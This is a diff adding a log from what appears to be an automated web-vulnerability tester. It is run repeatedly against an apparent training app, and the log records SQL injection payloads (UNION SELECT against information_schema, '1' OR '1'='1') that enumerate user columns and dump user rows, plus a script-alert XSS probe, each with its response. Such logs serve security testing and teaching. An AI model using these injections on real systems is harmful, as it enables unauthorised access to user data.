@@ -1,0 +1,1116 @@
+2020-09-02 14:58:28,208 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-02 14:58:28,248 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-02 14:58:28,263 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-02 14:58:28,275 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-02 14:58:28,287 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-02 14:58:28,299 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-02 14:58:28,311 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-02 14:58:28,323 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-02 14:58:28,336 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
+2020-09-02 14:58:28,349 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-02 14:58:28,363 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-02 14:58:28,376 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-02 14:58:28,934 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-02 14:58:28,969 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-02 14:58:28,983 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-02 14:58:28,997 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+2020-09-02 14:58:29,009 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-02 14:58:29,023 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-02 14:58:34,457 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-02 14:58:34,462 : INFO : cross_browser.log : Got alert : micin
+2020-09-02 14:58:34,539 : INFO : cross_browser.log : Got response : Hello 
+2020-09-02 15:03:31,069 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-02 15:03:31,128 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-02 15:03:31,142 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-02 15:03:31,154 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-02 15:03:31,166 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-02 15:03:31,178 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-02 15:03:31,191 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-02 15:03:31,202 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-02 15:03:31,216 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
+2020-09-02 15:03:31,233 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-02 15:03:31,249 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-02 15:03:31,266 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-02 15:03:31,470 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-02 15:03:31,506 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-02 15:03:31,521 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-02 15:03:31,535 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+2020-09-02 15:03:31,548 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-02 15:03:31,562 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-02 15:03:37,008 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-02 15:03:37,013 : INFO : cross_browser.log : Got alert : micin
+2020-09-02 15:03:37,047 : INFO : cross_browser.log : Got response : Hello 
+2020-09-02 15:21:20,159 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-02 15:21:20,413 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-02 15:21:20,425 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-02 15:21:20,507 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-02 15:21:20,519 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-02 15:21:20,531 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-02 15:21:20,543 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-02 15:21:20,554 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-02 15:21:20,566 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
+2020-09-02 15:21:20,578 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-02 15:21:20,593 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-02 15:21:20,607 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-02 15:21:25,794 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-02 15:21:25,852 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-02 15:21:25,874 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-02 15:21:25,886 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+2020-09-02 15:21:25,898 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-02 15:21:25,910 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-02 15:21:31,378 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-02 15:21:31,382 : INFO : cross_browser.log : Got alert : micin
+2020-09-02 15:21:31,416 : INFO : cross_browser.log : Got response : Hello 
+2020-09-02 15:29:04,493 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-02 15:29:04,558 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-02 15:29:04,572 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-02 15:29:04,587 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-02 15:29:04,602 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-02 15:29:04,615 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-02 15:29:04,627 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-02 15:29:04,640 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-02 15:29:04,653 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
+2020-09-02 15:29:04,668 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-02 15:29:04,681 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-02 15:29:04,694 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-02 15:29:04,944 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-02 15:29:04,978 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-02 15:29:04,995 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-02 15:29:05,007 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+2020-09-02 15:29:05,021 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-02 15:29:05,033 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-02 15:29:10,632 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-02 15:29:10,634 : INFO : cross_browser.log : Got alert : micin
+2020-09-02 15:29:10,676 : INFO : cross_browser.log : Got response : Hello 
+2020-09-02 17:00:17,682 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-02 17:00:17,767 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-02 17:00:17,780 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-02 17:00:17,792 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-02 17:00:17,803 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-02 17:00:17,815 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-02 17:00:17,827 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-02 17:00:17,839 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-02 17:00:17,851 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
+2020-09-02 17:00:17,863 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-02 17:00:17,878 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-02 17:00:17,901 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-02 17:00:18,698 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-02 17:00:18,735 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-02 17:00:18,750 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-02 17:00:18,761 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+2020-09-02 17:00:18,773 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-02 17:00:18,786 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-02 17:00:24,892 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-02 17:00:24,897 : INFO : cross_browser.log : Got alert : micin
+2020-09-02 17:00:24,944 : INFO : cross_browser.log : Got response : Hello 
+2020-09-02 18:27:25,773 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-02 18:27:25,863 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-02 18:27:25,992 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-02 18:27:26,005 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-02 18:27:26,019 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-02 18:27:26,032 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-02 18:27:26,044 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-02 18:27:26,056 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-02 18:27:26,070 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
+2020-09-02 18:27:26,089 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-02 18:27:26,102 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-02 18:27:26,113 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-02 18:27:26,626 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-02 18:27:26,673 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-02 18:27:26,685 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-02 18:27:26,697 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+2020-09-02 18:27:26,709 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-02 18:27:26,723 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-02 18:27:35,081 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-02 18:27:35,091 : INFO : cross_browser.log : Got alert : micin
+2020-09-02 18:27:35,149 : INFO : cross_browser.log : Got response : Hello 
+2020-09-02 18:32:01,334 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-02 18:32:01,395 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-02 18:32:01,416 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-02 18:32:01,563 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-02 18:32:01,574 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-02 18:32:01,587 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-02 18:32:01,599 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-02 18:32:01,611 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-02 18:32:01,624 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
+2020-09-02 18:32:01,637 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-02 18:32:01,653 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-02 18:32:01,668 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-02 18:32:02,746 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-02 18:32:02,791 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-02 18:32:02,812 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-02 18:32:02,832 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+2020-09-02 18:32:02,846 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-02 18:32:02,863 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-02 18:32:08,438 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-02 18:32:08,441 : INFO : cross_browser.log : Got alert : micin
+2020-09-02 18:32:08,477 : INFO : cross_browser.log : Got response : Hello 
+2020-09-02 18:40:34,313 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-02 18:40:34,354 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-02 18:40:34,365 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-02 18:40:34,377 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-02 18:40:34,389 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-02 18:40:34,400 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-02 18:40:34,412 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-02 18:40:34,423 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-02 18:40:34,435 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
+2020-09-02 18:40:34,446 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-02 18:40:34,457 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-02 18:40:34,469 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-02 18:40:37,224 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-02 18:40:37,261 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-02 18:40:37,273 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-02 18:40:37,286 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+2020-09-02 18:40:37,302 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-02 18:40:37,315 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-02 18:40:42,904 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-02 18:40:42,906 : INFO : cross_browser.log : Got alert : micin
+2020-09-02 18:40:42,962 : INFO : cross_browser.log : Got response : Hello 
+2020-09-03 11:50:45,654 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-03 11:50:45,717 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-03 11:50:45,729 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-03 11:50:45,741 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-03 11:50:45,753 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-03 11:50:45,764 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
+2020-09-03 11:50:45,777 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-03 11:50:45,789 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-03 11:50:45,800 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-03 11:50:45,813 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-03 11:50:45,825 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-03 11:50:45,840 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-03 11:50:46,022 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-03 11:50:46,065 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-03 11:50:46,080 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-03 11:50:46,094 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
